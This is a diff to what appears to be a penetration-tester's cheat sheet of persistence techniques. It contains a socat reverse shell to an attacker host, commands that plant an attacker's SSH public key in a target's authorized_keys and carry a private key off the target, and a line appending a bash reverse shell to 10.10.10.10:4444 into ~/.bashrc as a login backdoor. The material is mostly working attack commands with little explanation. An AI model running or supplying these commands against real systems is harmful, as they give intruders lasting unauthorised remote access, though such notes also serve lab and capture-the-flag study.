@@ -21,8 +21,11 @@ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid
 -----------------
 # in target
 mkdir -p ~/.ssh/
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> ~/.ssh/authorized_keys 
-# in our system 
+ssh-keygen
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> ~/.ssh/authorized_keys
+# transfer id_rsa target file to our kali 
+# in our kali 
+chmod 600 id_rsa 
 ssh user@10.10.10.10 -i id_rsa  
 -----------------
 echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
